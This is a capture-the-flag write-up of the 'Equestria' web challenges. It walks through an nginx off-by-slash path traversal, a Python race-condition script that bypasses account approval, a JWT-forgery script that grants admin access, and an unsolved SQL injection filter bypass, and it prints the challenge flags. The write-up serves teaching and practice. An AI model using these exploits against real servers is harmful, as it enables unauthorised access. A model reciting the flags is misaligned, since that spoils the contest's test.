# Equestria

## \[★★☆\] Equestria - Door To The Stable

### Description

We are suspecting that the website on [http://exp.cybergame.sk:7000/](http://exp.cybergame.sk:7000/) is hiding something. We need to find out what is hidden in the website. We've gathered what seems to be a proxy configuration file from our trusted source.

Download: [nginx.conf](https://ctf-world.cybergame.sk/files/75d67a183633d3343f8d52845a6d295b/nginx.conf?token=eyJ1c2VyX2lkIjoyOTQsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjR9.aAvGNw.9e3Fc2NyGYCs4h8xaiHvFpH-EAI "nginx.conf")

### Config

```yml
events {
    worker_connections 1024;
}

http {
    include mime.types;

    server {
        listen 80;
        server_name localhost;

        root /app/src/html/;
        index index.html;

        location /images {
            alias /app/src/images/;
            autoindex on;
        }

        location /ponies/ {
            alias /app/src/ponies/;
        }

        location /resources/ {
            alias /app/src/resources/;
        }

        location /secretbackend/ {
            proxy_pass http://secretbackend:3000/;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
        }
    }
}
```

### Solution

![Equestria - Door To The Stable.png](/assets/ctf/cybergame/equestria---door-to-the-stable.png)

Nothing fancy on the frontend, but there's a Reverse Proxy running from [http://exp.cybergame.sk:7000/secretbackend/](http://exp.cybergame.sk:7000/secretbackend/)

However it requires authentication.

![Equestria - Door To The Stable-1.png](/assets/ctf/cybergame/equestria---door-to-the-stable-1.png)

The `nginx.conf` has 4 `location` blocks, so 4 routes which go somewhere else.
```yml
location /images {
location /ponies/ {
location /resources/ {
location /secretbackend/ {
```

If you look closer you might notice that `/images` is missing a slash, this is a very bad practice in nginx which is know as **[Nginx-Off-Slash](https://github.com/unl1k3ly/Nginx-Off-Slash)** 

And just like that we bypassed the authorization
```bash
└─$ curl http://exp.cybergame.sk:7000/images../secretbackend/
<html>
<head><title>Index of /images../secretbackend/</title></head>
<body>
<h1>Index of /images../secretbackend/</h1><hr><pre><a href="../">../</a>
<a href="public/">public/</a>                                            05-Mar-2025 10:23                   -
<a href="db.js">db.js</a>                                              31-Mar-2025 19:21                3825
<a href="index.js">index.js</a>                                           18-Mar-2025 12:26                4348
<a href="jwt.js">jwt.js</a>                                             13-Mar-2025 15:13                 895
<a href="package-lock.json">package-lock.json</a>                                  13-Mar-2025 13:03               99556
<a href="package.json">package.json</a>                                       13-Mar-2025 13:03                 457
</pre><hr></body>
</html>
```

![Equestria - Door To The Stable-2.png](/assets/ctf/cybergame/equestria---door-to-the-stable-2.png)

Download source
```bash
mkdir src
curl http://exp.cybergame.sk:7000/images../secretbackend/index.js -so src/index.js
curl http://exp.cybergame.sk:7000/images../secretbackend/db.js -so src/db.js
curl http://exp.cybergame.sk:7000/images../secretbackend/jwt.js -so src/jwt.js
curl http://exp.cybergame.sk:7000/images../secretbackend/package.json -so src/package.json
curl http://exp.cybergame.sk:7000/images../secretbackend/package-lock.json -so src/package-lock.json
```

`db.js` contains hardcoded credentials for database. One of the users has a `SECRET_NOTE` which should probably be flag to solve the challenge.

![Equestria - Door To The Stable-3.png](/assets/ctf/cybergame/equestria---door-to-the-stable-3.png)

or not...

![Equestria - Door To The Stable-4.png](/assets/ctf/cybergame/equestria---door-to-the-stable-4.png)

```bash
└─$ base64 -d <<<'cHIxbmNlc3M6U0stQ0VSVHswZmZfYnlfNF9zMW5nbGVfc2w0c2hfZjgzNmE4YjF9'
pr1ncess:SK-CERT{0ff_by_4_s1ngle_sl4sh_f836a8b1}
```

::: tip Flag
`SK-CERT{0ff_by_4_s1ngle_sl4sh_f836a8b1}`
:::

## \[★★☆\] Equestria - Shadow Realm

### Description

The secret website is protected by a login page. Can you find a way to get in?

### Solution

This is a follow up challenge to previous one, now we have to login into the application and find another flag.

::: tip Creds
`pr1ncess:SK-CERT{0ff_by_4_s1ngle_sl4sh_f836a8b1}`
:::

![Equestria.png](/assets/ctf/cybergame/equestria.png)

The following route is interesting. There's no mention of what  `is_d4rk_pr1nc3ss` method is, but if we had to guess it probably means we are logged in as `pr1ncess`, but not with the HTTP Basic Authentication. 
```js
app.get("/api/secret-note", authMiddleware, async (req, res) => {
  if (req.user.is_d4rk_pr1nc3ss) { return res.send(process.env.DARK_PRINCESS_SECRET); }
  return res.send("You are not the Dark Princess");
});
```

```bash
└─$ curl http://exp.cybergame.sk:7000/secretbackend/api/secret-note -H 'Authorization: Basic cHIxbmNlc3M6U0stQ0VSVHswZmZfYnlfNF9zMW5nbGVfc2w0c2hfZjgzNmE4YjF9'
{"error":"No token provided"}
# or
└─$ curl http://exp.cybergame.sk:7000/secretbackend/api/secret-note -u 'pr1ncess:SK-CERT{0ff_by_4_s1ngle_sl4sh_f836a8b1}'
{"error":"No token provided"} 
```

The token is not generated if we login using this secret Authorization value.

We have code for JWT, but the Secret value is randomly generated string.

![Equestria-1.png](/assets/ctf/cybergame/equestria-1.png)

Let's register and login to see what happens.
```bash
└─$ curl 'http://exp.cybergame.sk:7000/secretbackend/api/register' -u 'pr1ncess:SK-CERT{0ff_by_4_s1ngle_sl4sh_f836a8b1}' --json '{"username":"test","password":"test","email":"test@test.test"}' -i
HTTP/1.1 200 OK
Server: nginx/1.27.4
Date: Fri, 25 Apr 2025 18:25:43 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 96
Connection: keep-alive
X-Powered-By: Express
ETag: W/"60-uYPbysyY8hWvIPRh/rssRXkQDws"

{"success":true,"message":"Welcome to the Dark Stable. The Council will judge your worthiness."} 

└─$ curl 'http://exp.cybergame.sk:7000/secretbackend/api/login' -u 'pr1ncess:SK-CERT{0ff_by_4_s1ngle_sl4sh_f836a8b1}' --json '{"username":"test","password":"test"}'
{"error":"The Dark Council has not approved you yet"} 
```

After reviewing the code I found that there's a Race Condition. `sendEmailToAdministrator` halts the logic of `register` API, and we have exactly 1 second to login into the application before `verified` becomes `false`.

![Equestria-2.png](/assets/ctf/cybergame/equestria-2.png)

```python
from asyncio import gather, create_task, run
from base64 import b64decode
from aiohttp import ClientSession
from random import randbytes
from urllib.parse import unquote

URL = 'http://exp.cybergame.sk:7000/secretbackend/api'
AUTH_HEADER = {'Authorization': 'Basic cHIxbmNlc3M6U0stQ0VSVHswZmZfYnlfNF9zMW5nbGVfc2w0c2hfZjgzNmE4YjF9'}

async def fetch(session, url, data):
    async with session.post(url, json=data) as response:
        return await response.json(), response.headers.get('Set-Cookie')

async def main():
    while True:
        username = randbytes(16).hex()
        print(f'Username: {username}, Password: {username}, Email: {username}@cyberame.sk')

        login_data = {"username": username, "password": username}
        register_data = {**login_data, "email": f"{username}@cybergame.sk"}

        async with ClientSession() as session:
            session.headers.update(AUTH_HEADER)

            register_task = create_task(fetch(session, f"{URL}/register", register_data))
            login_task = create_task(fetch(session, f"{URL}/login", login_data))

            results = await gather(register_task, login_task)
            for result in results:
                print(f'Status: {result[0]}, Message: {result[1]}')
                if result[1]:
                    cookie = unquote(result[1].split(';')[0])
                    value = b64decode(cookie.split('.')[1]).decode().split(';')[0]
                    print(f"Cookie: {value}")
                    return 

if __name__ == "__main__":
    run(main())
```

::: info Note
Not 110% winner 😳, may need to rerun to win the race~~
:::

```bash
Username: 4cc85c3fb3993267143ee4371ecfadf1, Password: 4cc85c3fb3993267143ee4371ecfadf1, Email: 4cc85c3fb3993267143ee4371ecfadf1@cyberame.sk
({'success': True, 'message': 'Welcome to the Dark Stable. The Council will judge your worthiness.'}, None)
({'success': True, 'welcome_msg': 'Access granted. The light has no power here. You walk the path of the unseen, where only those who understand the night may tread. Tread carefully, for even the darkness has its watchers… SK-CERT{r4c3_4g41n5t_th3_l1ght_4nd_w1n_w1th_th3_p0w3r_0f_th3_n1ght}'}, 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImRhYTVjMzU4LTcyNjUtNGZlZS04NjZjLWU3YzAyMzE2ODgwNCIsInVzZXJuYW1lIjoiNGNjODVjM2ZiMzk5MzI2NzE0M2VlNDM3MWVjZmFkZjEifQ%3D%3D.sq4vdfwmZ3u7AIvj7kSRyjFC8aL1T4yrTzlHNmNv2fo%3D; Path=/; HttpOnly; SameSite=Strict')
```

::: tip Flag
`SK-CERT{r4c3_4g41n5t_th3_l1ght_4nd_w1n_w1th_th3_p0w3r_0f_th3_n1ght}`
:::

## \[★★☆\] Equestria - The Dark Ruler

### Description

There seems to be an endpoint that is only accessible by a privileged user. Can you find a way to access it?

### Solution

Okay, now that we are able to login our focus shifts towards `/api/secret-note` denoted by the description.

Source:
```js
function authMiddleware(req, res, next) {
  const token = req.cookies.token;
  if (!token) return res.status(401).json({ error: "No token provided" });

  const payload = verifyToken(token);
  if (!payload) { return res.status(401).json({ error: "Invalid token" }); }

  req.user = payload;
  next();
}

app.get("/api/secret-note", authMiddleware, async (req, res) => {
  if (req.user.is_d4rk_pr1nc3ss) { return res.send(process.env.DARK_PRINCESS_SECRET); }
  return res.send("You are not the Dark Princess");
});
```

Initially I thought `is_d4rk_pr1nc3ss` was some hidden attribute we didn't have access to, but no! It literally is a non-existant key in the json payload

The JWT token is split into 3 parts
1. Metadata
2. Payload
3. Signature

![Equestria-3.png](/assets/ctf/cybergame/equestria-3.png)

`verifyToken` returns the `Payload` as part of Javascript dictionary object if the signature matches with defined logic.

```js
const crypto = require("crypto");
const { v4 } = require("uuid");

const JWT_SECRET = v4(); // God knows what the f#*k this is

function createToken(payload) {
  const base64Payload = Buffer.from(JSON.stringify(payload)).toString("base64");
  const signature = crypto
    .createHmac("sha256", JWT_SECRET)
    .update(base64Payload)
    .digest("base64");

  return `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.${base64Payload}.${signature}`;
}

function verifyToken(token) {
  const parts = token.split(".");
  if (parts.length < 3) return null; // Can be more then 3, but not less 🤔

  const payload = parts[1];
  const signature = parts[parts.length - 1];

  const expectedSignature = crypto
    .createHmac("sha256", JWT_SECRET)
    .update(parts[parts.length - 2]) // Weird indexing
    .digest("base64");

  if (signature === expectedSignature) { return JSON.parse(Buffer.from(payload, "base64").toString()); }
  return null;
}

module.exports = { createToken, verifyToken };
```

The `Metadata` part is always hardcoded to `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`, also I just realized there's no actual JWT library, just raw functions acting like JWT authentication.

`verifyToken` is very fishy, but can't seem to put finger on why.
1. It checks that given JWT contains 3 parts, but never checks if there's more (and frankly doesn't care)
2. `expectedSignature` is calculated from `JWT_SECRET` + `parts[parts.length - 2]` (second item from the end, which should always be **Payload** but can be anything since parts can be more then 3)

TLDR: We need payload to be like
```json
{
	"id":"402a0cd8-2249-4f29-8176-29f3b36b66ae",
	"username":"whatever",
	"is_d4rk_pr1nc3ss": "truthy_value"
}
```

The code is flawed, and if we have something like this we are golden!
```bash
metadata.malicious_payload.dummy.original_payload.signature

1. metadata - The original metadata
2. malicious_payload - New payload we will inject // parts[1]
3. dummy - doesnt matter, filler
4. original_payload - Original payload for signature // parts[parts.length - 2]
5. signature - Original payload signature // parts[parts.length - 1]
```

For above to work we need valid token from application and then we can forge it.
```python
import json 
from base64 import b64encode as be

COOKIE = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImRhYTVjMzU4LTcyNjUtNGZlZS04NjZjLWU3YzAyMzE2ODgwNCIsInVzZXJuYW1lIjoiNGNjODVjM2ZiMzk5MzI2NzE0M2VlNDM3MWVjZmFkZjEifQ%3D%3D.sq4vdfwmZ3u7AIvj7kSRyjFC8aL1T4yrTzlHNmNv2fo%3D'

metadata, payload, signature = COOKIE.split('.')

malicious_payload = be(json.dumps({
    "id":"402a0cd8-2249-4f29-8176-29f3b36b66ae",
    "username":"letmein",
    "is_d4rk_pr1nc3ss": True
}).encode()).decode()

payload = f'{metadata}.{malicious_payload}.filler.{payload}.{signature}'
print(payload)
```

```bash
└─$ curl http://exp.cybergame.sk:7000/secretbackend/api/secret-note -H 'Authorization: Basic cHIxbmNlc3M6U0stQ0VSVHswZmZfYnlfNF9zMW5nbGVfc2w0c2hfZjgzNmE4YjF9' -b 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ICI0MDJhMGNkOC0yMjQ5LTRmMjktODE3Ni0yOWYzYjM2YjY2YWUiLCAidXNlcm5hbWUiOiAibGV0bWVpbiIsICJpc19kNHJrX3ByMW5jM3NzIjogdHJ1ZX0=.filler.eyJpZCI6ImRhYTVjMzU4LTcyNjUtNGZlZS04NjZjLWU3YzAyMzE2ODgwNCIsInVzZXJuYW1lIjoiNGNjODVjM2ZiMzk5MzI2NzE0M2VlNDM3MWVjZmFkZjEifQ%3D%3D.sq4vdfwmZ3u7AIvj7kSRyjFC8aL1T4yrTzlHNmNv2fo%3D'
They fear the night, yet they do not understand its power. The fools bask in the daylight, blind to what lurks beyond the stars. But I see. I remember. And soon, they will too. The throne was never meant for the sun alone. The time will come. I must be patient. SK-CERT{1_w1ll_rul3_th3_n1ght_4nd_th3_d4y} 
```

::: tip Flag
`SK-CERT{1_w1ll_rul3_th3_n1ght_4nd_th3_d4y} `
:::

## \[★★☆\] Equestria - Final Curse

### Description

The last piece of information we need should be in the notes of one of the users. We need to find it.

**Disclaimer**: Was not able to solve within given time.

### Solution

The only code where SQLi is possible is here:
```js
function filterSQLChars(input) {
  return input.replace(/['";\\=()\/\n\r ]/g, "").replaceAll("--", "");
}

app.get("/api/notes", authMiddleware, async (req, res) => {
  try {
    const q = "SELECT * FROM notes WHERE user_id = '{{user_id}}'".replace("{{user_id}}", filterSQLChars(req.user.id));
    const { rows } = await dbAsync.query(q);
    return res.json(rows);
  } catch (err) {
    return res.status(500).json({ error: "Query failed", err: err.message });
  }
});

app.post("/api/notes", authMiddleware, async (req, res) => {
  try {
    const { content } = req.body;
    const { rows } = await dbAsync.query("INSERT INTO notes (user_id, content) VALUES ($1, $2) RETURNING id", [req.user.id, content]);
    return res.json({ id: rows[0].id });
  } catch (err) {
    return res.status(500).json({ error: "Failed to create note" });
  }
});
```

Database type is Postgres and the filters are very limited. To begin SQLi we somehow need to escape the quotes, but can't since it's blocked.

Resource: [https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/PostgreSQL%20Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/PostgreSQL%20Injection)

Turns out it was never about SQL, but **Javascript**...

![Equestria-4.png](/assets/ctf/cybergame/equestria-4.png)

![Equestria-5.png](/assets/ctf/cybergame/equestria-5.png)

> Credit: `trololo1004` (Discord)

> Writeup 2: [lukaskuzmiak: cybergame.sk-2025-writeups, Equestria](https://github.com/lukaskuzmiak/cybergame.sk-2025-writeups/tree/main/Equestria)

::: tip Flag
`SK-CERT{j4v4scr1p7_1s_full_of_curs3d_(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(![]+[])[+[]]+(![]+[])[+[]]}`
:::

